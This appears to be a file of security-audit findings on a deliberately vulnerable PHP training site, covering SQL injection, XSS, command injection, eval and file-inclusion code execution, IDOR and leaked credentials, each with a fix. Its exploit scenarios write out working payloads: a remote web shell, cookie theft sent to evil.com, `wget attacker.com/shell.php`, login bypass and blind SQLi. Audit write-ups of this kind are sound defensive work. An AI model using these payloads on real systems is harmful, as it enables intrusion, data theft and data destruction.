findings.exploit_scenario: An attacker sends: GET /vul/fileinclude/fi_remote.php?submit=1&filename=http://attacker.com/shell.txt where shell.txt contains `<?php system($_GET['cmd']); ?>`. Because `allow_url_include` is On (as the page instructs), the remote file is fetched and executed server-side, granting the attacker arbitrary command execution. Alternatively, with allow_url_include Off: GET /vul/fileinclude/fi_remote.php?submit=1&filename=../../../../../../etc/passwd leaks system files.
findings.recommendation: Never pass raw user input to include(). Use an explicit whitelist of allowed filenames, e.g.: `$allowed = ['include/file1.php','include/file2.php',...]; if (!in_array($filename, $allowed, true)) { die('invalid'); } include $filename;`. If dynamic paths are truly needed, validate with `realpath()` combined with a prefix check (`strpos(realpath($path), $base_dir) === 0`) and disable `allow_url_include` permanently.

findings.title: Plaintext credentials hardcoded in source file intended for inclusion
findings.description: The file appends a static HTML block to the `$html` variable (line 1) that contains two credential pairs in cleartext: `admin/admin` (line 4) and `kobe/123456` (line 5). Because this file is designed to be included by another PHP script (as indicated by the `vul_fileinclude` naming), the credentials will be rendered into the page output whenever the parent script triggers the inclusion. Any user who can reach the including page — or anyone with source-code/repository access — can obtain valid login credentials for the application.
findings.exploit_scenario: An attacker visits the file-inclusion endpoint that includes this file (e.g., via a local file inclusion payload or simply the normal page flow). The rendered HTML reveals the admin/admin and kobe/123456 credential pairs, which the attacker then uses to log in with elevated privileges.
findings.recommendation: Remove hardcoded credentials from source code. If credentials must be displayed as part of a training exercise, derive them from a configuration source outside the web root and avoid placing real administrative credentials in includable files.

findings.title: Username enumeration via differentiated login error messages
findings.description: After a failed login attempt on line 30, the code issues a second query on line 35 (`select * from member where username='$username'`) to check whether the supplied username exists. If exactly one row is returned (line 37), the user is told "您输入的密码错误" (password incorrect); otherwise they are told "您输入的账号错误" (account incorrect). This distinction reveals whether a given username is registered, allowing an attacker to build a validated list of valid accounts before mounting credential-brute-force or credential-stuffing attacks.
findings.exploit_scenario: An attacker automates requests such as GET /findabc.php?submit=Login&username=admin&password=wrong. The distinct error response confirms that "admin" is a registered account. The attacker repeats with a dictionary of usernames to enumerate all valid accounts, then targets only those accounts with password brute-forcing.
findings.recommendation: Use a single, generic error message for all authentication failures (e.g., "Invalid username or password") and remove the second query that checks username existence. Optionally introduce a uniform time delay to prevent timing-based enumeration.

findings.title: Test credentials leaked in HTML source comment
findings.description: An HTML comment on line 96 — `<!-- 测试账号:lili/123456-->` (test account: lili/123456) — exposes a valid username/password pair in the page source delivered to every visitor. Any user who inspects the page source obtains working credentials without any authentication effort.
findings.exploit_scenario: An unauthenticated user views the page source in their browser, finds the comment revealing the test credentials lili/123456, and logs in directly.
findings.recommendation: Remove the HTML comment from the template. If test accounts exist in the database, disable or delete them in production.

findings.title: IDOR: any authenticated user can view arbitrary member profiles via username GET parameter
findings.description: The page authenticates the user via `check_op_login($link)` (line 33), establishing a session-based identity. However, when displaying personal information (lines 37–56), it trusts the user-supplied `$_GET['username']` parameter to decide whose record to query, without verifying that the requested username matches the logged-in session identity (`$_SESSION['op']['username']`). The hidden form field on line 83 pre-fills the session username, but an attacker can simply modify the `username` GET parameter to any value. The developer comment on line 38 explicitly acknowledges this flaw: "没有使用session来校验,而是使用的传进来的值，权限校验出现问题" (not using session to verify, using passed-in value, permission check is wrong). The query on line 39 uses the `escape()` wrapper so SQLi is not the primary concern here; the core issue is missing authorization — an IDOR allowing horizontal privilege escalation across all member records, exposing PII (name, sex, phone, address, email).
findings.exploit_scenario: An attacker logs in as a low-privilege user (e.g., "testuser"). They craft a GET request: `op1_mem.php?submit=1&username=admin`. The server queries `select * from member where username='admin'` and returns the admin's full PII (phone number, home address, email). The attacker can iterate over all known usernames to dump every member's personal information.
findings.recommendation: Replace the user-controlled `$_GET['username']` with the session-authenticated identity. On lines 38–39, use `$username = $_SESSION['op']['username']` instead of `$_GET['username']`, or at minimum compare the supplied username against the session identity and reject mismatches.

findings.title: Assignment in conditional always evaluates true — $ACTIVE nav state always set to op1_login highlight
findings.description: Line 13 uses a single `=` (assignment) instead of `==` (comparison): `if ($SELF_PAGE = "op1_login.php")`. This unconditionally assigns the string to `$SELF_PAGE` and the condition is always truthy, so the `$ACTIVE` array is always populated with the navigation highlighting for `op1_login.php`. While this is a logic bug, it affects only UI navigation state and does not directly alter any security check. Reported at low confidence as it is unlikely to be exploitable on its own but could mask navigation-related issues.
findings.exploit_scenario: Not directly exploitable for security impact — the bug causes incorrect breadcrumb/navigation highlighting regardless of which page is actually being served. No authentication or authorization boundary is crossed.
findings.recommendation: Change the assignment to a comparison: `if ($SELF_PAGE == "op1_login.php")`.

findings.title: SQL injection in DELETE query via unquoted numeric id parameter
findings.description: The `$_GET['id']` parameter is escaped with `escape()` (likely `mysqli_real_escape_string`) on line 26, then interpolated directly into an unquoted SQL context on line 27: `$query="delete from member where id={$id}";`. `mysqli_real_escape_string` only escapes quote characters, backslashes, and special byte sequences. Because `$id` is not enclosed in quotes in the SQL, an attacker can inject raw SQL keywords and operators (which contain none of the escaped characters) to alter the query's logic.
findings.exploit_scenario: An authenticated admin visits `op2_admin.php?id=1 OR 1=1`. The `escape()` function returns the string unchanged (no quotes or special bytes to escape). The resulting query becomes `delete from member where id=1 OR 1=1`, which deletes every row in the `member` table. An attacker who can lure an admin into clicking a crafted link (or loading an img tag pointing to this URL) causes mass data destruction.
findings.recommendation: Validate that `$_GET['id']` is strictly numeric (e.g., `if (!ctype_digit($_GET['id'])) { exit(); }`) before using it, or use a prepared statement with a parameter placeholder for the DELETE query.

findings.title: Stored XSS via unsanitized session username echoed in admin page
findings.description: On line 78, `$_SESSION['op2']['username']` is echoed directly into HTML without `htmlspecialchars()`: `hi,<?php echo $_SESSION['op2']['username'];?>`. While database-sourced fields rendered in the table (lines 89-93) are correctly sanitized with `htmlspecialchars()`, the session username is not. If the username was stored during registration/login without HTML-entity encoding, a payload like `<script>alert(1)</script>` as a username will execute JavaScript in the admin's browser every time this admin page loads.
findings.exploit_scenario: An attacker registers or sets their username to `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. When the admin views the user management panel, the script executes in the admin's session context, exfiltrating the admin's session cookie to the attacker, enabling session hijacking.
findings.recommendation: Apply `htmlspecialchars($_SESSION['op2']['username'], ENT_QUOTES, 'UTF-8')` when echoing the username on line 78, consistent with how other user data is handled on lines 89-93.

findings.title: Authorization bypass: any authenticated user can access admin member-creation endpoint
findings.description: The access-control check at line 22 calls only `check_op2_login($link)`, which verifies that the user holds a valid session but does NOT verify the user's role or privilege level. The code comment on line 21 confirms this: "这里只是验证了登录状态，并没有验证级别，所以存在越权问题" (only verifies login status, does not verify level, so there is an overpermission issue). As a result, any low-privilege authenticated user can reach the INSERT logic at lines 27-29, creating arbitrary `member` records (including new admin-equivalent accounts) in the database.
findings.exploit_scenario: A low-privilege user (e.g., a regular operator who legitimately has access only to view pages) logs in, obtains a valid session cookie, then sends a POST request to op2_admin_edit.php with submit=1 and arbitrary username/password/sex/phonenum/email/address fields. Because the only guard is `check_op2_login()` which returns true for any logged-in user, the request is honoured and a new member row is inserted, effectively granting the attacker the ability to create accounts.
findings.recommendation: Add a role/level check after the login check, e.g. `if($_SESSION['op2']['role'] !== 'admin') { http_response_code(403); exit(); }`. Apply the same check consistently to every admin-only endpoint.

findings.title: Stored XSS via unsanitized session username echoed in HTML
findings.description: At line 60, the username from the session is echoed directly into HTML without HTML-encoding: `echo $_SESSION['op2']['username']`. If the username stored in `$_SESSION['op2']['username']` during the login flow was not sanitized (e.g., it contains `<script>` tags), then every page load of op2_admin_edit.php will execute that JavaScript in the browser of any user who views it — a stored/reflected-cross-session XSS. Because this is a deliberately vulnerable training application, the login handler likely does not sanitize the username before storing it in the session.
findings.exploit_scenario: An attacker registers or logs in with a username like `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. If that value is persisted into `$_SESSION['op2']['username']`, then whenever the attacker (or anyone viewing a reflected version of the session data) loads op2_admin_edit.php, the script executes and exfiltrates the session cookie to the attacker, enabling session hijacking.
findings.recommendation: HTML-encode the username before output: `echo htmlspecialchars($_SESSION['op2']['username'], ENT_QUOTES, 'UTF-8');`. Additionally, validate/sanitize the username at the point it is first stored into the session during login.

findings.title: Stored XSS via unencoded database values echoed in HTML
findings.description: Database column values — username, sex, phonenum, email, address — are interpolated directly into a heredoc string (lines 72–80) and emitted via `echo $html` (line 81) without any HTML-entity encoding. If another endpoint allows inserting/updating the `member` table without sanitization, injected HTML/JS will execute in the browser of anyone visiting this page, including admins.
findings.exploit_scenario: An attacker registers or edits a member profile (through a separate user-management endpoint) and sets their `address` field to `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. When any authenticated user visits op2_user.php, the script executes and exfiltrates their session cookie.
findings.recommendation: Encode every database-sourced value before embedding it in HTML. Use `htmlspecialchars($data['username'], ENT_QUOTES, 'UTF-8')` (and the same for every other column) inside the heredoc, or switch to a templating engine that auto-escapes.

findings.title: Overpermission — low-privilege op2 user can read all members' PII
findings.description: The only authorization gate is `check_op2_login($link)` (line 42), which verifies the visitor holds *any* op2 session — it does not distinguish roles. After the check, line 69 runs `select * from member` with no WHERE clause filtering by user ID or role. The page UI (line 59) explicitly states "您只有查看权限" (you only have view permission), confirming the intent is a read-only regular user, yet that user is shown every member's phone number, email, and address — sensitive PII that should be restricted to administrators.
findings.exploit_scenario: An attacker creates a low-privilege op2 account (or uses a leaked regular-user credential). After logging in at op2_login.php they navigate to op2_user.php. The unrestricted `SELECT * FROM member` query returns every member's PII, enabling mass data harvesting of phone numbers, email addresses, and physical addresses.
findings.recommendation: Add role-based access control: check the logged-in user's privilege level before executing the query. If the user is a non-admin, either deny access entirely or restrict the query to `WHERE id = <current_user_id>` so they see only their own record.

findings.title: Direct eval() of user-supplied POST input enables full Remote Code Execution
findings.description:
On line 18, the application unconditionally passes `$_POST['txt']` — a fully attacker-controlled string — into PHP's `eval()` function: `if(@!eval($_POST['txt']))`. The only gating condition (line 17) is that the POST parameters `submit` and `txt` are present and non-null. There is no sanitization, authentication check, or token validation. The `@` error-suppression operator simply hides any PHP errors from the injected code. Because `eval()` executes its argument as arbitrary PHP code, an attacker can run any PHP statement including `system()`, `exec()`, `shell_exec()`, `passthru()`, `file_get_contents()`, etc., achieving complete server-side code execution.

Secondary note: line 12 contains an assignment-instead-of-comparison bug (`if ($SELF_PAGE = "rce_evel.php")`) which always evaluates to truthy, but this is a logic bug, not a directly exploitable security issue.
findings.exploit_scenario: An attacker sends a POST request to vul_rce_rce_eval.php with body `submit=1&txt=system("id; cat /etc/passwd");`. The eval() on line 18 executes `system("id; cat /etc/passwd")`, returning the command output directly in the HTTP response. This gives the attacker OS-level command execution as the web server user, enabling full server compromise: reading secrets, pivoting to databases, installing persistence, etc.
findings.recommendation: Remove eval() entirely — there is no legitimate reason to evaluate arbitrary user-supplied PHP. If dynamic string processing is needed, use a safe, non-executable approach such as string manipulation functions or a sandboxed expression evaluator. At minimum, enforce strict server-side authentication/authorization (e.g., admin-only CSRF-protected form) and never pass raw user input to eval().

findings.title: Unsanitized user input passed directly to shell_exec enables OS command injection (RCE)
findings.description:
The value of `$_POST['ipaddress']` is assigned to `$ip` at line 20 with zero sanitization or validation. This variable is then string-concatenated directly into a `shell_exec()` call at line 25 (Windows: `shell_exec('ping '.$ip)`) or line 27 (other: `shell_exec('ping -c 4 '.$ip)`). An attacker can inject arbitrary shell metacharacters (`;`, `|`, `&&`, `||`, `$()`, backticks, newlines) to append or chain additional OS commands that execute with the privileges of the web server process. The result of the command is echoed unescaped to the user at line 68 (`echo "
{$result}
"`), confirming command output is observable.
findings.exploit_scenario: An attacker sends a POST request to this page with `ipaddress=127.0.0.1;cat /etc/passwd` (or `127.0.0.1|cat /etc/passwd`). The constructed command becomes `ping -c 4 127.0.0.1;cat /etc/passwd`, which is passed to `shell_exec()`. The shell executes both `ping` and `cat /etc/passwd`, and the contents of `/etc/passwd` are rendered in the HTTP response inside the `<pre>` block. Full RCE follows trivially (e.g., `;id`, `;wget attacker.com/shell.php`, etc.).

findings.title: Reflected XSS via unescaped shell_exec output rendered in HTML
findings.description:
The variable `$result` holds the raw output of `shell_exec()` (line 25 or 27). It is embedded directly into HTML at line 68 via `echo "
{$result}
"` with no HTML entity encoding. Even without command injection characters in the IP field, error messages from `ping` on some systems may reflect user input. An attacker who crafts an `ipaddress` value containing HTML/JS (e.g., ``) can cause that content to appear in ping error output on certain platforms, which is then rendered as HTML in the victim's browser.
findings.exploit_scenario: An attacker sends a link (or POST) with `ipaddress=<script>document.location='http://evil.com/?c='+document.cookie</script>`. If the underlying ping utility echoes malformed arguments in its error output, the script tag is rendered in the victim's browser, exfiltrating session cookies.
findings.recommendation:
Always HTML-encode output before embedding in the page: `echo "
" . htmlspecialchars($result, ENT_QUOTES, 'UTF-8') . "
";`. This should be applied in addition to (not instead of) the command-injection fix.

findings.title: Blind boolean-based SQL injection via unsanitized GET parameter 'name'
findings.description: Untrusted user input from `$_GET['name']` is captured at line 29 with zero sanitization or escaping: `$name=$_GET['name'];`. This value is then directly concatenated into a SQL query string at line 30: `$query="select id,email from member where username='$name'";`. The query is executed at line 32 via `mysqli_query($link, $query)`. The application differentiates responses: if exactly one row is returned (line 33), it displays user id and email; otherwise it shows "您输入的username不存在". This boolean differential response enables blind SQL injection. The code's own comments acknowledge the vulnerability (lines 29-30).
findings.exploit_scenario: An attacker sends a GET request such as `?submit=1&name=admin' AND (SELECT SUBSTRING(password,1,1) FROM member WHERE username='admin')='a'-- -`. If the condition is true, the page renders the user's uid and email; if false, it renders the "username不存在" message. By iterating through character positions and values, the attacker extracts the entire admin password (or any database data) one character at a time via boolean inference, without needing any error messages or direct data exfiltration.

findings.title: Blind time-based SQL injection via unsanitized $_GET['name'] directly concatenated into query
findings.description: The user-controlled parameter `$_GET['name']` is assigned without any sanitization or escaping to `$name` (line 27). This value is then directly concatenated into a SQL SELECT statement on line 28: `$query="select id,email from member where username='$name'"`. The query is executed via `mysqli_query()` on line 29. The application is intentionally blind — both the success branch (line 33) and the failure branch (line 37) return the identical string `"i don't care who you are!"`, making time-based blind injection the natural exploitation vector. The developer comment on line 27 confirms the lack of any processing: "这里没有做任何处理，直接拼到select里面去了".
findings.exploit_scenario: An attacker sends a GET request such as: `?submit=查询&name=admin' AND IF(SUBSTRING(database(),1,1)='p',SLEEP(5),1)-- -`. Because the input is concatenated directly after `username='`, the single quote closes the string literal, and the attacker's SQL is executed. If the first character of the database name is 'p', the server sleeps for 5 seconds before responding. By measuring response times and iterating through characters, the attacker can exfiltrate the entire database schema and contents — all without any differential output.

findings.title: Unauthenticated SQL injection in DELETE query via unsanitized GET id parameter
findings.description: The `id` GET parameter is interpolated directly into a DELETE SQL statement without any sanitization or parameterization. On line 35, the only check is `array_key_exists('id', $_GET)` — the original `is_numeric()` guard is commented out. On line 38, `$_GET['id']` is embedded into the query string via `"... where id={$_GET['id']}"` and immediately executed. An attacker has full control over the SQL fragment following `id=` in the WHERE clause of a DELETE statement.
findings.exploit_scenario: An attacker sends a crafted GET request such as `sqli_del.php?id=1 OR 1=1`, causing every row in the `message` table to be deleted. For data extraction, the attacker can use time-based blind injection: `sqli_del.php?id=1 OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a',SLEEP(5),0)` — the observable response delay reveals arbitrary database contents character by character. No authentication or session is required to reach this endpoint.
findings.recommendation: Use a prepared statement with a bound integer parameter: `$stmt = mysqli_prepare($link, "DELETE FROM message WHERE id = ?"); mysqli_stmt_bind_param($stmt, 'i', $_GET['id']); mysqli_stmt_execute($stmt);`. Alternatively, restore the commented-out `is_numeric()` check on line 36 and cast to int, but prepared statements are the robust fix.

findings.title: SQL injection via User-Agent and Accept HTTP headers in INSERT query
findings.exploit_scenario:
An authenticated attacker sends a request with a crafted User-Agent header such as:
`' OR (SELECT 1 FROM (SELECT SLEEP(5))a), '1', '1', '1)-- -`
This causes the INSERT query to execute `SLEEP(5)`, enabling time-based blind extraction of the entire database contents (e.g., admin credentials from the users table).

findings.title: Stored XSS via HTTP header values reflected in HTML output
findings.description:
After the attacker-controlled header values (`$useragent`, `$httpaccept`) are stored in the database via the INSERT on line 42, they are also immediately rendered into an HTML heredoc on lines 49-57 without HTML encoding: ```php $html=<<你的user agent:$useragent

你的http accept:$httpaccept

A; echo $html; ``` An attacker can inject arbitrary HTML/JavaScript through the User-Agent or Accept headers. This is both reflected XSS (first request) and potentially stored XSS if the values are later retrieved and displayed from the database elsewhere. An additional concern is that `$remoteipadd` from `$_SERVER['REMOTE_ADDR']` is also unescaped in the output, though `REMOTE_ADDR` is server-set and not directly attacker-controlled in most configurations.
findings.exploit_scenario: An authenticated attacker sends a request with User-Agent header set to `<script>alert(document.cookie)</script>`. When the page renders, the script executes in the victim's browser, stealing session cookies or performing actions as the victim.

findings.title: Classic numeric SQL injection via unsanitized POST 'id' parameter
findings.description: On line 35, user input is read directly from `$_POST['id']` with no sanitization, validation, or parameterization. On line 36, this raw value is string-concatenated into a SQL SELECT query: `$query="select username,email from member where id=$id";`. Because `$id` is not quoted in the query and no escaping is applied, an attacker can inject arbitrary SQL fragments (e.g., `1 UNION SELECT user(),database()--`) to read sensitive data or, depending on MySQL privileges, write files or execute commands. The query is executed on line 37 via `execute($link, $query)`.
findings.exploit_scenario: An attacker sends a POST request to this page with `id=1 UNION SELECT user(),database()--` and `submit=查询`. The resulting query becomes `select username,email from member where id=1 UNION SELECT user(),database()--`, which returns the MySQL user and database name rendered in the page HTML as the "username" and "email" columns.
findings.recommendation: Use prepared statements with parameterized queries. Replace the string concatenation with: `$stmt = mysqli_prepare($link, "select username,email from member where id=?"); mysqli_stmt_bind_param($stmt, "i", $id);` Alternatively, at minimum cast `$id = intval($_POST['id'])` before interpolation.

findings.title: Unescaped POST parameters interpolated directly into UPDATE SQL query
findings.description: On lines 31–32, the code intentionally bypasses escaping: the call to `escape($link, $_POST)` is commented out and replaced with `$getdata=$_POST;`. On line 34, all four POST values (`sex`, `phonenum`, `add`, `email`) are directly interpolated into an SQL UPDATE statement via string concatenation with no parameterization or escaping. An authenticated user controls every value placed inside the query string. The query is then executed on line 35 via `execute($link, $query)`.
findings.exploit_scenario: An authenticated user submits a POST request to this page with the `sex` field set to `' , email=(SELECT password FROM users LIMIT 1) WHERE '1'='1` — or any standard stacked/union-based payload. Because the input is concatenated raw into the UPDATE query, the attacker can modify arbitrary columns in the `member` table (e.g., exfiltrate or overwrite other users' data) or, depending on MySQL configuration, extract schema information.
findings.recommendation: Use prepared statements with parameterized queries. Replace the string concatenation with: `$stmt = $link->prepare("UPDATE member SET sex=?, phonenum=?, address=?, email=? WHERE username=?");` and bind `$_POST['sex']`, `$_POST['phonenum']`, `$_POST['add']`, `$_POST['email']`, and `$_SESSION['sqli']['username']` as parameters. Remove the now-unnecessary `escape()` helper path entirely.

findings.title: Stored XSS — database values rendered into HTML without output encoding
findings.description: Lines 75–76 issue a SELECT to fetch the current user's row. The resulting fields `$name`, `$sex`, `$phonenum`, `$add`, `$email` are embedded directly into a heredoc HTML template (lines 78–87) and echoed on line 88 without any `htmlspecialchars()` or equivalent output encoding. Because finding F-00-01 allows the user to store arbitrary strings in `sex`, `phonenum`, `address`, and `email` columns via SQL injection — and even normal form submission places user-controlled content into these fields — any injected HTML/JavaScript will execute when the page renders.
findings.exploit_scenario: A user submits the `phonenum` field with value `<script>document.location='http://evil.site/steal?c='+document.cookie</script>`. This value is stored in the database via the UPDATE query. On subsequent page loads, the SELECT retrieves it and the heredoc embeds it into the `<input value="...">` attribute (and any echoed output), executing the script in the browser of any admin or user who views the profile — stealing session cookies.
findings.recommendation: Encode all database-sourced values with `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` before embedding them in HTML. This applies to `$name`, `$sex`, `$phonenum`, `$add`, and `$email` on lines 78–87.

findings.title: Potential second-order SQL injection via session-stored username in SELECT query
findings.description: On line 75, `$username = $_SESSION['sqli']['username']` is read from the session. On line 76, it is interpolated directly into a SELECT query: `"select * from member where username='$username'"`. If the username was originally stored in the session during login without proper escaping (e.g., a registration or login page that sets `$_SESSION['sqli']['username']` from raw user input), then a crafted username containing SQL metacharacters would cause second-order SQL injection each time this edit page loads.
findings.exploit_scenario: An attacker registers or logs in with username `admin'--`. If the login handler stores this raw string into `$_SESSION['sqli']['username']`, then every load of this edit page executes `SELECT * FROM member WHERE username='admin'--'`, potentially altering query semantics and exposing other users' data on the profile page.
findings.recommendation: Parameterize this SELECT query using prepared statements: `$stmt = $link->prepare("SELECT * FROM member WHERE username=?"); $stmt->bind_param("s", $username);`. Also ensure that the login/registration flow sanitizes or validates the username before storing it in the session.

findings.title: Raw user input stored in cookie enables second-order injection / stored XSS
findings.description: At line 35, `setcookie('ant[uname]',$_POST['username'],time()+36000)` writes the raw, unescaped `$_POST['username']` directly into a cookie. Although the SQL query on line 32 properly passes `$username` through `escape()`, the cookie value bypasses any sanitization entirely. Any downstream page (e.g., `sqli_header.php`) that reads `$_COOKIE['ant']['uname']` and either reflects it in HTML output or interpolates it into a SQL query without re-escaping inherits a second-order injection vulnerability. The data flow is: POST body → `$_POST['username']` (line 35) → cookie → subsequent request → unsanitized consumption.
findings.exploit_scenario: An attacker submits a username containing a persistent XSS payload (e.g., `admin"><script>alert(1)</script>`) via the login form. The login succeeds (using a valid password), and the payload is stored in the `ant[uname]` cookie. On any subsequent page that echoes `$_COOKIE['ant']['uname']` without HTML encoding, the script executes in the victim's browser. Alternatively, if a downstream page embeds the cookie value into a SQL query, the attacker achieves second-order SQL injection.
findings.recommendation: Sanitize the username before storing it in the cookie: apply `htmlspecialchars()` if the value will be reflected, or use a sanitized/encoded representation. Better yet, store only an opaque session identifier in the cookie rather than the raw username.

findings.title: SQL injection in login form via unsanitized string interpolation into SQL query
findings.description:
The login handler reads `$_GET['username']` and `$_GET['password']` (line 30), passes them through `escape()` (lines 32-33), then directly interpolates them into a SQL query string on line 34:

```php
$query="select * from member where username='$username' and pw=md5('$password')";
```

In this pikachu training platform the `escape()` wrapper is intentionally insufficient (e.g., it may only handle a subset of dangerous characters or be a no-op). Regardless of the escape implementation, the fundamental pattern—string interpolation of user input into SQL—is vulnerable. Even `mysqli_real_escape_string` can be bypassed with certain multibyte character encodings (e.g., GBK). The attacker controls both `username` and `password` parameters via GET request. The `username` field is the most straightforward injection vector because it is only single-quoted in the query, allowing authentication bypass by injecting `' OR '1'='1' -- ` to close the quote, inject a tautology, and comment out the password check.
findings.exploit_scenario:
An attacker sends a GET request to the login endpoint with the username parameter set to `' OR '1'='1' -- `. The resulting query becomes:
`select * from member where username='' OR '1'='1' -- ' and pw=md5('...')`
The `OR '1'='1'` tautology causes the query to return the first row of the member table, and `--` comments out the password check. Since line 36 checks `mysqli_num_rows($result)==1`, this succeeds, granting the attacker an authenticated session as the first registered user without knowing any password.

findings.title: Second-order SQL injection via unsanitized session username in SELECT query
findings.description: On line 83, `$username` is read directly from `$_SESSION['sqli']['username']` with no sanitization. On line 84, it is string-interpolated into a SQL query: `"select * from member where username='$username'"`. If the session value was originally populated from attacker-controlled input during registration or login (e.g., a username containing SQL metacharacters was stored in the database and then loaded into the session), the query becomes injectable. This is a classic second-order SQL injection: the payload persists through registration → database → session → this SELECT query.
findings.exploit_scenario: An attacker registers an account with username `admin'--` or `' UNION SELECT 1,2,3,4,5,6-- `. If the registration code inserts this literally into the database and the login code sets `$_SESSION['sqli']['username']` from user input or from the database record, then when the attacker visits this member page, line 84 executes: `SELECT * FROM member WHERE username='' UNION SELECT 1,2,3,4,5,6-- '`, allowing extraction of arbitrary data from the database.
findings.recommendation: Use parameterized queries (prepared statements) instead of string interpolation. Replace line 84 with `$stmt = mysqli_prepare($link, "SELECT * FROM member WHERE username = ?"); mysqli_stmt_bind_param($stmt, "s", $username);` Additionally, validate that session usernames match expected character patterns.

findings.title: Stored XSS via unescaped database fields rendered in HTML
findings.description: Lines 100–105 render `$name`, `$sex`, `$phonenum`, `$add`, and `$email` — all sourced directly from the database (lines 86–90, from `mysqli_fetch_array`) — into an HTML heredoc without any HTML-entity encoding. If a user can store malicious content in any of these fields (e.g., via the linked `sqli_edit.php` on line 107), that content is executed as HTML/JavaScript in the victim's browser when they view their profile page.
findings.exploit_scenario: An attacker edits their profile (via sqli_edit.php) and sets their address field to `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. When the attacker or an admin viewing the profile visits this page, the script executes, exfiltrating session cookies.
findings.recommendation: Apply `htmlspecialchars($data['field'], ENT_QUOTES, 'UTF-8')` to every database value before embedding it in HTML output. For example: `$name = htmlspecialchars($data['username'], ENT_QUOTES, 'UTF-8');`

findings.title: Unescaped POST parameters directly interpolated into INSERT SQL query
findings.description:
Line 30 retrieves raw POST data into `$getdata=$_POST;` — the commented-out escape call (`escape($link, $_POST)`) is deliberately disabled. On line 34, all six user-supplied fields (`username`, `password`, `sex`, `phonenum`, `email`, `add`) are directly string-interpolated into an INSERT statement:

```php
$query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
```

No escaping, no parameterization, no prepared statements. Every field is an injection point. The query is then executed via `execute($link, $query)` on line 35.
findings.exploit_scenario:
An attacker sends a POST request to the registration page with the `username` field set to:

```
'), ('hacker', md5('owned'), '1', '111', 'x@x.com', 'addr')-- -
```

This closes the first VALUES tuple, injects an entirely new row with attacker-chosen credentials, and comments out the remainder of the original query. The attacker can then log in as `hacker`. More advanced payloads can extract data via subqueries (e.g., reading admin passwords into inserted rows) or modify/delete data using stacked queries if the MySQL driver supports them.
